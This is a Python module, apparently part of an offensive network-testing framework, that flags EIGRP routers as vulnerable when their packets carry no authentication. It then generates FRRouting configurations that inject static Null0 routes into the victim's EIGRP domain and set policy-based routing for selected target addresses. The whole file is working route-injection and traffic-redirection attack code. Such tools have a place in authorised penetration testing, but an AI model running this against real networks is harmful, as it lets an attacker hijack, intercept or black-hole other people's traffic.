import sys
sys.path.append("..")
import protocol_parser
from state import user_var
import utility

def detect_if_vulnerable(packet):
    if packet.haslayer('EIGRPAuthData'):
        return False
    else:
        return True

def get_packet_data(packet):
    source_mac, source_ip, destination_mac, destination_ip = protocol_parser.get_data_from_layer_two_and_three(packet)
    asn = packet['EIGRP'].asn
    hold_time = packet['EIGRPParam'].holdtime
    return source_mac, source_ip, destination_mac, destination_ip, asn, hold_time

def build_configurations(packet):

    eigrpd_config = ''
    eigrpd_config += '!\n'
    eigrpd_config += 'router eigrp {}\n'.format(str(packet.asn))
    eigrpd_config += ' network {}/32\n'.format(utility.get_ip_address_from_interface(user_var.interface))

    staticd_config = ''
    pbrd_config = ''

    if user_var.inject or user_var.redirect:

        count = 0

        eigrpd_config += ' redistribute static\n'
        staticd_config += '!\n'
        pbrd_config += '!\n'
        pbrd_config += 'interface {}\n'.format(user_var.interface)
        pbrd_config += ' pbr-policy PBRMAP\n'

        for ip in user_var.ipaddress:
            staticd_config += 'ip route {} Null0\n'.format(ip)

            count += 1
            pbrd_config += '!\n'
            pbrd_config += 'pbr-map PBRMAP seq {}\n'.format(count)
            pbrd_config += ' match dst-ip {}\n'.format(ip)
            pbrd_config += ' set nexthop {}\n'.format(utility.get_default_gateway())

        for ip in user_var.redirectaddresses:
            staticd_config += 'ip route {} Null0\n'.format(ip)

            count += 1
            pbrd_config += '!\n'
            pbrd_config += 'pbr-map PBRMAP seq {}\n'.format(count)
            pbrd_config += ' match dst-ip {}\n'.format(ip)
            pbrd_config += ' set nexthop {}\n'.format(utility.get_default_gateway())

    eigrpd_config += '!\n'
    staticd_config += '!\n'
    pbrd_config += '!\n'

    return eigrpd_config, staticd_config, pbrd_config